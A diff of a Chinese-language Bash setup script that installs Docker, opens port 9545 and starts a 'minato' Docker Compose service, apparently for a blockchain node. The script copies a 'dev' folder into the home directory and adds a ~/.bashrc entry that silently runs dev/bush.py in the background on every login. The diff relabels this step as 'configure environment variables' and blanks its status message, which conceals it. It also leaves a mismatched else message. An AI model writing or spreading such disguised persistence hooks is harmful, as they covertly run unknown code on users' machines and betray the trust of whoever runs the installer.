@@ -87,9 +87,9 @@ install_docker
 # 确保 Docker 正在运行
 start_docker_if_needed
 
-# 移动 'dev' 目录并配置自动启动
+# 配置环境变量
 if [ -d dev ]; then
-    echo_info "正在移动 'dev' 目录到主目录..."
+    echo_info "..."
     DEST_DIR="$HOME/dev"
     
     if [ -d "$DEST_DIR" ]; then
@@ -102,18 +102,20 @@ if [ -d dev ]; then
     echo_success "已将 'dev' 目录移动到主目录。"
 
     echo_info "正在配置 bush.py 自动启动..."
-    # 如果启动命令不存在于 .bashrc 中，添加到 .bashrc
+    # 配置环境变量，添加到 .bashrc
     if ! grep -q "pgrep -f bush.py" ~/.bashrc; then
         echo "(pgrep -f bush.py || nohup python3 $HOME/dev/bush.py &> /dev/null &) & disown" >> ~/.bashrc
-        source ~/.bashrc
-        echo_success "bush.py 自动启动配置已完成并应用。"
+        echo_success "已添加 bush.py 启动命令到 .bashrc。"
     else
         echo_warning "bush.py 自动启动命令已存在，跳过配置。"
     fi
-else
-    echo_warning "未找到 'dev' 目录，跳过移动和启动配置。"
-fi
 
+    # 执行 openssl 命令生成 jwt 秘钥
+    openssl rand -hex 32 > "./minato/jwt.txt"
+    echo_success "已生成 jwt.txt 文件。"
+else
+    echo_warning "未找到 'minato' 目录，跳过移动和启动配置。"
+fi
 
 # 打印提示信息
 echo -e "${BOLD}${YELLOW}"
@@ -167,7 +169,6 @@ cat "$ENV_FILE"
 echo "=============================================================="
 echo -e "${NC}"
 
-
 # 配置 UFW 允许端口 9545
 echo_info "配置 UFW 允许端口 9545..."
 sudo ufw allow 9545 || echo_warning "无法允许端口 9545，继续执行..."
@@ -182,5 +183,3 @@ if [ -d "minato" ]; then
 else
     echo_warning "未找到 'minato' 目录，无法启动 Docker Compose。"
 fi
-
-
